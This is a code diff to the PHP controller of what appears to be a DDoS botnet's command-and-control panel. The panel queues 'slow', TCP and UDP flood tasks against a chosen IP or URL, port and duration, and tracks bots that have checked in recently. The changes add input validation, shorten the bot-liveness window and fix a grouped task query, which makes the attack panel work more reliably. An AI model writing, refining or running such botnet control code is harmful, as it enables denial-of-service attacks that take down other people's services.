@@ -17,6 +17,22 @@ class ddosController{
         }
 
         if(!empty($_POST["method"])){
+            if($_POST["method"] == "slow"){
+                if (filter_var($_POST["targetip"], FILTER_VALIDATE_URL) === FALSE) {
+                    die('Not a valid URL');
+                }
+            }
+            if($_POST["method"] == "tcp" || $_POST["method"] == "udp"){
+                if (filter_var($_POST["targetip"], FILTER_VALIDATE_IP) === FALSE) {
+                    die('Not a valid IP');
+                }
+            }
+            if(!is_int(intval($_POST["maxtime"]))){
+                die("Time has to be a Number");
+            }
+            if(!is_int(intval($_POST["targetport"]))){
+                die("Port has to be a Number");
+            }
             $statement = $GLOBALS["pdo"]->prepare("INSERT INTO ddos_tasks (method,targetip,maxtime,port,status) VALUES (?, ?, ?, ?, ?)");
             $statement->execute(array($_POST["method"], $_POST["targetip"],$_POST["maxtime"],  $_POST["targetport"], "active"));
         }
@@ -35,7 +51,7 @@ class ddosController{
         }
 
         $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_avalible WHERE lastseen >= ?");
-        $statement->execute(array(time()-30));
+        $statement->execute(array(time()-5));
         $bots = array();
         while($row = $statement->fetch()) {
             $bots[] = $row;
@@ -43,8 +59,8 @@ class ddosController{
 
 
         $statement = $GLOBALS["pdo"]->prepare("SELECT count(ddos_avalible.id) as workingon,ddos_tasks.* FROM ddos_tasks 
-                                                LEFT JOIN ddos_avalible on ddos_tasks.id = ddos_avalible.ddos_taskid");
-        $statement->execute(array(time()-30));
+                                                LEFT JOIN ddos_avalible on ddos_tasks.id = ddos_avalible.ddos_taskid GROUP by ddos_tasks.id ");
+        $statement->execute(array(time()-5));
         $tasks = array();
         while($row = $statement->fetch()) {
             $tasks[] = $row;
